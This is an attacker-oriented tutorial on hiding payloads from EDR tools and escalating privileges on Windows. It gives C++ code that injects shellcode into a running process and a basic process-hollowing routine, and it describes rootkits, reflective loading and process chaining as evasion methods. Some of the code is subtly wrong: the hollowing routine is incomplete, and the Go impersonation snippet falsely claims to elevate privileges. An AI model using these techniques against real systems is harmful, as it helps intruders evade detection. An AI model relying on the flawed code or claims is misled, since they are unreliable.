# Privilege Escalation: Hack the Stack

We’re talking about running under the radar, messing with EDRs (Endpoint Detection and Response systems), and keeping our payloads hidden. Kernel-mode rootkits, especially, are super stealthy and tougher to detect, though they require higher privileges.


### 1. In-Memory Infection
Skip disk writes and inject the payload straight into high-priority memory. This approach avoids leaving files on the hard drive, which makes it less likely for EDRs to catch on.

### 2. Code Injection
Inject code directly into an existing process to avoid creating new ones, which keeps the execution quiet and reduces the chances of being detected.

#### **Example (C++)**

```cpp
// Injects a payload into notepad.exe for eg
#include <Windows.h>
#include <iostream>

int main() {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, <TARGET_PID>);
    LPVOID addr = VirtualAllocEx(hProcess, nullptr, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hProcess, addr, shellcode, sizeof(shellcode), nullptr);
    CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)addr, nullptr, 0, nullptr);
    CloseHandle(hProcess);
}
```

### 3. Process Hollowing
Create a new process, empty out its memory, and load your payload into it. This allows you to execute without launching a new, suspicious process.

#### **Example (C++)**

```cpp
// Basic process hollowing
#include <Windows.h>
#include <iostream>

int main() {
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    if (CreateProcess(L"target.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        LPVOID addr = VirtualAllocEx(pi.hProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        WriteProcessMemory(pi.hProcess, addr, shellcode, sizeof(shellcode), NULL);
        ResumeThread(pi.hThread);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }
    return 0;
}
```

### 4. Token Impersonation
Impersonate a user with elevated privileges by leveraging their token. This lets you execute your payload at higher privilege without launching new processes.

#### **Example (Go)**

```go
// Token impersonation Go snippet (using syscall)
package main

import (
    "fmt"
    "syscall"
)

func main() {
    err := syscall.ImpersonateSelf(syscall.SecurityImpersonation)
    if err == nil {
        fmt.Println("Privileges elevated successfully.")
    }
}
```

### 5. Process Injection
Inject your payload into an already running process to keep things quiet. This allows for seamless execution without creating a new process, which minimizes attention from EDRs.

### 6. Reflective Loading
Load code directly into memory without ever touching the disk. This approach is perfect for hiding DLLs or other resources

### 7. Kernel-Mode and User-Mode Rootkits
Rootkits are powerful tools that help hide your payload from the operating system and EDRs. Kernel mode operates at a low level but requires high privileges, while user-mode is easier to implement but potentially less stealthy.

### 8. Process Chaining
Create a series of processes that execute tasks in sequence. The first process starts, then triggers the next, which triggers the next, creating a chain that EDRs are less likely to trace back.

---
